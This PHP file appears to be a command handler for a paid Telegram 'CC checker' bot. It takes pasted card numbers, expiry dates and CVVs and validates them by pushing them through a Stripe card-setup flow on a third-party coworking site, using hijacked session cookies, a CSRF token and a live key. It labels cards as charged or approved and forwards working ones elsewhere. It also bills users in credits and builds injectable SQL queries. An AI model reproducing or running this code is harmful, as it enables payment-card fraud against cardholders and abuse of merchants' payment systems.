<?php
if(strpos($message, '!sa') === 0 or strpos($message, '/sa') === 0 or strpos($message, '.sa') === 0){
// reply_to($chatId,$message_id,$keyboard,$maintain);
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();}
if (empty($cvv)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
$bin = substr($cc,0,6);
$che = bannedbin($bin);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
    
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://members.coworkerhub.com/api/2.2/payments/setup/stripe-card-setup-info');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: members.coworkerhub.com',
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'X-CSRF-TOKEN: a7wJOUYPv16DvaKBURzgEun9bq2Z422dGPAzwBnk',
'User-Agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://members.coworkerhub.com/account/billing/sources',
'Accept-Encoding: gzip, deflate',
'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
'Cookie: UDGFDSDT=a7wJOUYPv16DvaKBURzgEun9bq2Z422dGPAzwBnk; session=TLJJlSrsJ8C3cA9HhJRih5CVZxUiadZqo1f0Nu8V; laravel_token=eyJpdiI6IjAzdUU1WWVRM1BLNU5vZGZwR0dBNXc9PSIsInZhbHVlIjoiV2RqU3NIeG82SnlEQ2d1Y09SZjlsK3Ayc2ljRU9BTHdVOUlhOGROUDJiMzhKekY0WHEzUkdnbFo0OVNwTVdnaVpEYjRMMzBHWnBjRENtanNuNjMxSGJlY2gwNnRzT3UyM2xaOVVrQmZrZEhQSEF1VHZTK3BjbHRQdHJGOUFBTjdXOHQ1NVdFMGRINmpISElkZ1lxcmxVQzRXR1l4a2hheHQ4Q0RRQ2FuckdlY3V1Mm1aU2xrXC9nYXlZcGRIRVpYRXNVUDJva0kzQlN5RHI5MUU3bTZSSDNnY1BYTTZIUU4zRFZucXc4SmtHcFd4RHp1UUx2Sk83ODRZXC9SUGhyTk5TTEFLVXV6K2RzY1ZwMjV2WExYNkJiQT09IiwibWFjIjoiMmE5MTFiZDg3NGY4NWJhYTM3MWRkOTYyNGFmMTM3MTMzM2MwOWM0Mjg4YmViM2MwZWY1ZWFkZjJhOWY1N2U5MCJ9; XSRF-TOKEN=eyJpdiI6ImY4UE9aaCtudFZwUXZ5R2hlQjBtNGc9PSIsInZhbHVlIjoiMmJ2bkZZQVRKVUNcL2UrRDVDXC9od2RBMm1DNExIZ0hlZ2FcL3c4aDEwZkJPYklaNDVURld6RzBYcUFuYjFCNDZ4S3NCejZnZVRcL1wvUk9FMU55SnRyNUpLQT09IiwibWFjIjoiMTJmN2EyNzQ3MWJhY2EyYzgwZDcwMzY1N2IzMzk5MjNkMzVkZGZhYzc1NThlZjM4ZGJjZTQ2NDhjMDFiMTUxNSJ9'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
        $cs = trim(strip_tags(getStr($result, 'stripeCardSetupIntentClientSecret":"','"')));
    $id1 = trim(strip_tags(getStr($result, 'stripeCardSetupIntentClientSecret":"','_secret')));
curl_close($ch);
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
if (strpos($result, 'stripeCardSetupIntentClientSecret')){
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$id1/confirm");
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    "user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=1cf217de-bc75-4927-831d-7a397b9f6b7f5efd8a&payment_method_data[muid]=6d498f59-4e60-41a5-803b-690c99b437de5c6e81&payment_method_data[sid]=989a385c-4676-4523-a961-5fb2d9a43605ddd5f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F1842adaa6%3B+stripe-js-v3%2F1842adaa6&payment_method_data[time_on_page]=26558&payment_method_data[referrer]=https%3A%2F%2Fmembers.coworkerhub.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_UC724DIiUXCgW6ki788Aj3eD&client_secret='.$cs.'');
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $ccc = preg_replace('/_/', ' ', ucfirst($cap1["error"]['decline_code']));
    $code = preg_replace('/_/', ' ', ucfirst($cap1["error"]['code']));
    $res = $cap1["error"]['message'];
curl_close($ch);
}
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (strpos($result, 'state": "succeeded')){
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'status": "succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'requires_action')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'redirect_to_url')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'requires_payment_method')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'authentication')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVC PASS';
  rest($list);
  sendMessage1($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'insufficient funds')){
  $status = 'Succeeded✅';
  $cc_code = "Insufficient Funds";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'security code is incorrect')){
  $status = 'Succeeded✅';
  $cc_code = "Security code is incorrect";
  ccn($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(!empty($code)){
    $code = $code;
}elseif(empty($code)){
    $code = 'none';
}
if(!isset($result)){
// sendMessage1($result);
$result = urlencode("<b>
GATE --> <i>STRIPE - CHARGE-AUTH</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
sendMessage1($list);
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --><i> STRIPE - CHARGE-AUTH</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Code ->> $code
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>